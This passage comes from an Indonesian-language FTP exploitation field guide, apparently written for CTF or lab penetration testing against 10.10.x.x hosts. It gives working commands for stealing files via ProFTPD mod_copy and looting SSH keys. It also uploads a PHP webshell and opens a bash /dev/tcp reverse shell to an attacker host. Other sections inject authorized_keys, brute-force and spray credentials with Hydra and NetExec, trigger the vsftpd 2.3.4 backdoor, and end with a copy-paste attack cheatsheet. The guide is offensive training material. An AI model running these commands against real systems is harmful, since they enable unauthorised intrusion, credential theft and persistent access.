SITE CPTO /var/www/html/passwd.txt
# Lalu download dan baca untuk cari username valid
```

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
SITE CPTO /var/www/html/id_rsa_kenobi
550 /var/www/html/id_rsa_kenobi: Permission denied.
```

➡️ FTP process tidak punya write access ke webroot. Coba direktori lain:

Bash

```
SITE CPTO /tmp/id_rsa_kenobi
# Lalu cek apakah bisa diakses via web atau service lain
```

---

## ═══════════════════════════════════════

## FASE 4: AUTHENTICATED FTP ENUMERATION

## ═══════════════════════════════════════

> **Masuk sini jika sudah punya valid credentials** dari FASE 1 (file looting), dari SMB ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)), atau dari SSH/Web.

### Langkah 4.1 — Login & Eksplorasi Authenticated

Bash

```
# Set credentials yang ditemukan
export USER="tom"
export PASS="P@ssw0rd2024!"

# Test login
curl -s -u "$USER:$PASS" ftp://$TARGET/ --list-only

# Login interaktif
ftp -p $TARGET
# Username: tom
# Password: P@ssw0rd2024!
```

**OUTPUT BERHASIL ✅ — Login sukses:**

text

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Bash

```
# Di dalam ftp>, eksplorasi penuh
ftp> passive
ftp> binary
ftp> pwd
ftp> ls -la
ftp> cd /
ftp> ls -la       # Lihat root FTP filesystem
ftp> cd ..        # Coba navigasi ke atas (test chroot boundary)
ftp> pwd          # Apakah berubah?
```

**OUTPUT BERHASIL ✅ — Ada file baru yang accessible:**

text

```
drwxr-xr-x    5 tom      tom          4096 Jan 20 10:00 .
drwxr-xr-x    5 tom      tom          4096 Jan 20 10:00 ..
-rw-r--r--    1 tom      tom           220 Jan 20 09:00 .bash_logout
-rw-r--r--    1 tom      tom          3526 Jan 20 09:00 .bashrc
drwxr-xr-x    2 tom      tom          4096 Jan 20 09:30 .ssh
-rw-r--r--    1 tom      tom          1024 Jan 20 10:00 user.txt
drwxrwxrwx    2 root     root         4096 Jan 20 10:00 uploads
```

➡️ `.ssh` directory visible! Coba download key:

Bash

```
ftp> cd .ssh
ftp> ls -la
ftp> get id_rsa
ftp> get authorized_keys
```

**Output — Mapping Filesystem Decision:**

|PWD yang dilihat|Kemungkinan|Tindakan|
|---|---|---|
|`/var/www/html`|FTP = webroot|Upload webshell (ke PATH D)|
|`/home/tom`|FTP = user home|Inject SSH key (ke PATH E)|
|`/` atau `/ftp`|FTP isolated|Loot saja, cari sensitive files|
|Tidak berubah saat `cd ..`|Chroot aktif|Explore chroot, cari symlinks|

---

### Langkah 4.2 — PATH D: FTP → Webroot → RCE

Bash

```
# Test apakah FTP directory adalah webroot
echo "webroot-probe-$$" > /tmp/probe.txt

ftp -p $TARGET << EOF
user $USER $PASS
passive
binary
put /tmp/probe.txt probe_$$.txt
quit
EOF

# Test akses via HTTP
curl -s http://$TARGET/probe_$$.txt
```

**OUTPUT BERHASIL ✅ — File accessible via HTTP:**

text

```
webroot-probe-12345
```

➡️ **Konfirmasi webroot!** Identifikasi server-side language:

Bash

```
# Cek response headers untuk identify web framework
curl -I http://$TARGET/
# Server: Apache + PHP? ASP? Node?

# Buat minimal test file
echo "<?php echo 'php-ok'; ?>" > /tmp/php_test.php
# Upload dan test
curl http://$TARGET/php_test.php
```

**OUTPUT BERHASIL ✅ — PHP executed:**

text

```
php-ok
```

➡️ PHP aktif! Upload full webshell:

Bash

```
cat > /tmp/cmd.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
}
?>
EOF

ftp -p $TARGET << EOF
user $USER $PASS
passive
binary
put /tmp/cmd.php cmd.php
quit
EOF

# Test
curl "http://$TARGET/cmd.php?cmd=id"
curl "http://$TARGET/cmd.php?cmd=cat+/etc/passwd"

# Setup reverse shell
nc -lvnp $LPORT &
curl "http://$TARGET/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

---

### Langkah 4.3 — PATH E: FTP → SSH Authorized Keys

> **Kondisi WAJIB semua terpenuhi:** FTP maps ke user home directory + SSH port 22 aktif + `.ssh` direktori writable.

Bash

```
# Verifikasi kondisi
nmap -p 22 $TARGET  # SSH harus aktif

# Generate keypair baru
ssh-keygen -t ed25519 -f $LOOT_DIR/keys/ftp_injected -N ""
cat $LOOT_DIR/keys/ftp_injected.pub > /tmp/authorized_keys

# Upload authorized_keys
ftp -p $TARGET << EOF
user $USER $PASS
passive
binary
cd .ssh
put /tmp/authorized_keys authorized_keys
quit
EOF
```

**OUTPUT BERHASIL ✅ — Upload sukses:**

text

```
local: /tmp/authorized_keys remote: authorized_keys
226 Transfer complete.
```

Bash

```
# Test SSH login dengan key baru
ssh -i $LOOT_DIR/keys/ftp_injected $USER@$TARGET
```

**OUTPUT BERHASIL ✅ — SSH berhasil:**

text

```
tom@targetmachine:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom)
```

➡️ **SHELL SEBAGAI USER!** Lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)**.

**OUTPUT GAGAL ❌ — Permission denied (publickey):**

text

```
Permission denied (publickey).
```

➡️ Diagnosa:

Bash

```
# Cek permission .ssh directory dan file
ftp> ls -la .ssh/
# .ssh harus 700, authorized_keys harus 600

# Cek sshd config (jika bisa baca)
SITE CPFR /etc/ssh/sshd_config
SITE CPTO /var/www/html/sshd.txt
curl http://$TARGET/sshd.txt | grep AuthorizedKeys
```

---

## ═══════════════════════════════════════

## FASE 5: BRUTE FORCE FTP (LAST RESORT)

## ═══════════════════════════════════════

> **⚠️ WARNING:** Hanya lakukan jika anonymous diblokir DAN tidak ada CVE yang applicable DAN sudah punya username list dari enumerasi lain (SMB RPC, web, dll).

### Langkah 5.1 — Persiapan Username List

Bash

```
# Gunakan username dari SMB enumeration ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba))
cat ~/smb_loot/creds/users.txt | head -20

# Atau buat list dari temuan web/FTP
# Biasanya: admin, administrator, ftp, ftpuser, backup, www-data

# Buat password list dari temuan sebelumnya + common passwords
cat > /tmp/ftp_passwords.txt << 'EOF'
password
password123
Password1
Welcome1
admin
admin123
ftp
ftpuser
backup2024
EOF

# Tambahkan password yang ditemukan dari file FTP
echo "P@ssw0rd2024!" >> /tmp/ftp_passwords.txt
```

---

### Langkah 5.2 — Execute Bruteforce

Bash

```
# Command 1: Hydra (most reliable, max 4 threads untuk FTP!)
hydra -L ~/smb_loot/creds/users.txt -P /tmp/ftp_passwords.txt \
    -t 4 -f -V \
    $TARGET ftp

# Command 2: Single user bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    -t 4 -f -V \
    $TARGET ftp

# Command 3: NetExec (multi-user spray)
nxc ftp $TARGET -u ~/smb_loot/creds/users.txt -p /tmp/ftp_passwords.txt \
    --continue-on-success
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
[21][ftp] host: 10.10.11.200   login: ftpadmin   password: FtpAdm1n2023
```

➡️ Simpan credentials dan lanjut ke **FASE 4**:

Bash

```
export USER="ftpadmin"
export PASS="FtpAdm1n2023"
echo "$USER:$PASS" >> $LOOT_DIR/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — 421 Too many connections (thread terlalu tinggi):**

text

```
421 Service not available, remote server has closed connection.
```

➡️ Kurangi thread:

Bash

```
# Turunkan ke 1-2 thread
hydra -l admin -P /tmp/ftp_passwords.txt -t 1 -f -V $TARGET ftp
```

**OUTPUT GAGAL ❌ — Semua LOGON_FAILURE:**

text

```
[ERROR] target did not respond with correct ftp response
```

➡️ Password list tidak cocok. Options:

1. Cari username/password hint di tempat lain (web, SMB, etc)
2. Gunakan wordlist lebih besar: `/usr/share/wordlists/rockyou.txt`
3. Cari password policy hints dari web app atau banner

---

## ═══════════════════════════════════════

## FASE 6: CROSS-SERVICE PIVOT

## ═══════════════════════════════════════

> Setiap kali dapat credentials dari FTP, langsung test ke semua service yang relevan.

### Cross-Service Credential Testing

Bash

```
# Test credentials dari FTP ke semua service aktif
echo "[*] Testing $USER:$PASS against all services..."

# SSH (port 22)
nxc ssh $TARGET -u "$USER" -p "$PASS"
# Jika berhasil: ssh $USER@$TARGET → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>

# SMB (port 445)
nxc smb $TARGET -u "$USER" -p "$PASS"
# Jika berhasil: → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>

# WinRM (port 5985) - Windows
nxc winrm $TARGET -u "$USER" -p "$PASS"
# Jika berhasil: evil-winrm -i $TARGET -u "$USER" -p "$PASS"

# MySQL (port 3306)
nxc mysql $TARGET -u "$USER" -p "$PASS"
# Jika berhasil: → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>

# MSSQL (port 1433)
nxc mssql $TARGET -u "$USER" -p "$PASS"
# Jika berhasil: → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
```

### Attack Chain Matrix

text

```
FTP Findings → Pivot Destinations
     │
     ├─ ─ id_rsa (no passphrase) ──────────────→ <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> (PATH C)
     │
     ├─ ─ id_rsa (encrypted) ──────────────────→ ssh2john → crack → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │
     ├── plaintext credentials ───────────────→ Test SSH/SMB/Web/WinRM
     │   └── Found in notes.txt, config, etc       Pivot ke relevant workflow
     │
     ├── database backup (.sql/.db) ──────────→ 14_database_workflow.md
     │
     ├─ ─ web app config (wp-config.php/.env) →  <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
     │
     ├── writable FTP = webroot ──────────────→ Upload webshell → RCE → 44_linux_privesc
     │
     ├── FTP = user home + SSH active ────────→ inject authorized_keys → SSH
     │
     ├─ ─ username list ───────────────────────→ <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a> (spraying)
     │
     └─ ─ custom binary/executable ────────────→ <a href="/docs/binary-analysis" class="text-[#00b4d8] hover:underline font-mono font-semibold">48_binary_analysis_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi Langsung|
|---|---|---|
|`530 Login incorrect`|User/pass salah, anonymous disabled|Coba `ftp`/`anonymous`, cek TLS policy|
|`425 Failed to establish connection`|Active mode diblokir NAT/firewall|`ftp> passive` atau `ftp -p $TARGET`|
|`229 Entering Extended Passive Mode` + HANG|EPSV (IPv6) di jaringan IPv4|`ftp> epsv4 off` lalu `passive`|
|`550 Permission denied` (get/put)|Akun tidak punya izin|Pindah ke direktori lain: `/uploads`, `/tmp`, `/pub`|
|`421 Too many connections`|Thread brute force terlalu tinggi|Hydra: `-t 1` atau `-t 2`|
|`Connection refused port 21`|FTP mati atau port non-standar|`nmap -p- $TARGET` untuk cari port FTP|
|`220 Service ready` + disconnect|Server butuh TLS (FTPS)|Gunakan `lftp` dengan `ssl:verify-certificate no`|
|File corrupt setelah download|Transfer dalam ASCII mode|Ketik `binary` sebelum download|
|Port 6200 refused (vsftpd backdoor)|Versi di-patch, atau trigger gagal|Coba ulang trigger, cek dengan nmap NSE|
|`GnuTLS error` / TLS tidak bisa|Self-signed cert, TLS mismatch|`curl -k --ftp-ssl` atau `lftp` + `ssl:verify-certificate no`|
|`curl: (67) Access denied: 530`|Format URL salah atau anon denied|`curl -v -u "anonymous:anonymous" ftp://$TARGET/`|
|`227 Entering Passive Mode` + HANG|Port passive tidak reachable|Coba EPSV: `set ftp:prefer-epsv true` di lftp|

---

## MASTER DECISION TREE (RINGKASAN)

text

```
START: Port 21/990 Open
│
├─ FASE 0: Banner Grab + Version Detection
│   ├─ vsftpd 2.3.4 → Verifikasi CVE-2011-2523 → PATH A (Root Shell!)
│   ├─ ProFTPD 1.3.5 → Verifikasi mod_copy → PATH B (File Copy)
│   └─ Modern/Unknown → Lanjut anonymous check
│
├─ Langkah 0.3: Anonymous Check
│   ├─ [GRANTED] → PATH C: Loot semua file
│   │   ├─ [SSH key found] → Crack passphrase → SSH login
│   │   ├─ [Password found] → Test reuse ke semua service
│   │   ├─ [Database found] → Dump & extract creds
│   │   ├─ [Writable = Webroot] → Upload webshell → RCE
│   │   └─ [Nothing useful] → Cek write access
│   │
│   └─ [DENIED] → Coba variasi anonymous lalu ke Brute Force
│
├─ FASE 4: Authenticated FTP (Jika dapat creds dari file atau service lain)
│   ├─ [FTP = Webroot] → PATH D: Upload webshell → RCE → PrivEsc
│   ├─ [FTP = User Home + SSH] → PATH E: Inject authorized_keys → SSH
│   └─ [FTP terisolasi] → Loot more, cari pivot
│
├─ FASE 5: Brute Force (LAST RESORT)
│   └─ [Creds found] → Login FTP → PATH D/E → Shell
│
└─ FASE 6: Cross-Service Pivot
    ├─ FTP Creds → Test SSH/SMB/WinRM/DB
    └─ FTP Loot → Pivot ke workflow relevan
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export USER="anonymous"; export PASS="anonymous"
export LOOT_DIR="$HOME/ftp_loot"
mkdir -p $LOOT_DIR/{files,creds,keys}

# === RECON ===
nc -vn $TARGET 21                                              # Raw banner grab
nmap -sV -p 21 --script banner,ftp-syst,ftp-anon $TARGET      # Full fingerprint
nmap -p 21 --script ftp-vsftpd-backdoor $TARGET                # Verify CVE-2011-2523

# === ANONYMOUS ===
ftp -p $TARGET                                                 # Interactive (user: anonymous)
curl -s "ftp://anonymous:anonymous@$TARGET/" --list-only       # Non-interactive list
wget -m --no-passive-ftp --no-parent -P $LOOT_DIR/files/ ftp://anonymous:anonymous@$TARGET/
lftp -u 'anonymous,anonymous' $TARGET -e "mirror --parallel=5 / $LOOT_DIR/files/; quit"

# === FTP INTERACTIVE COMMANDS ===
# passive          → Aktifkan passive mode (WAJIB di VPN)
# binary           → Binary mode (WAJIB sebelum download)
# epsv4 off        → Fix EPSV hang di IPv4
# ls -la           → List semua file termasuk hidden
# recurse ON       → Enable recursive mget
# prompt OFF       → Disable mget confirmation
# mget *           → Download semua file
# put file.php     → Upload file

# === LOOT ANALYSIS ===
grep -riE "password|passwd|secret|token" $LOOT_DIR/files/ 2>/dev/null | head -50
find $LOOT_DIR -name "id_rsa*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find $LOOT_DIR -name "*.sql" -o -name "*.db" -o -name ".env" -o -name "wp-config.php" 2>/dev/null

# === EXPLOITATION ===
# vsftpd 2.3.4 backdoor:
echo -e "USER exploit:)\nPASS pass" | nc -vn $TARGET 21; nc -vn $TARGET 6200

# ProFTPD mod_copy:
# nc -vn $TARGET 21 → SITE CPFR /home/user/.ssh/id_rsa → SITE CPTO /var/www/html/id_rsa

# Webshell upload (jika FTP = webroot):
# put shell.php → curl "http://$TARGET/shell.php?cmd=id"

# === SSH KEY ===
chmod 600 $LOOT_DIR/keys/id_rsa
ssh-keygen -y -f $LOOT_DIR/keys/id_rsa    # Check passphrase
ssh2john $LOOT_DIR/keys/id_rsa > hash.txt; john hash.txt --wordlist=rockyou.txt

# === BRUTEFORCE (LAST RESORT) ===
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $TARGET ftp -t 4 -f -V
nxc ftp $TARGET -u users.txt -p passwords.txt --continue-on-success

# === FTPS ===
lftp -u "$USER,$PASS" ftp://$TARGET -e "set ssl:verify-certificate no; set ftp:ssl-force true; ls; quit"
curl -k --ftp-ssl -u "$USER:$PASS" ftp://$TARGET/
```

---

> **➡️ NEXT:** Setelah FTP selesai dan dapat credentials/shell, lanjut ke **[08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp)** untuk user enumeration via VRFY/EXPN, deteksi open relay, dan intercept email credentials.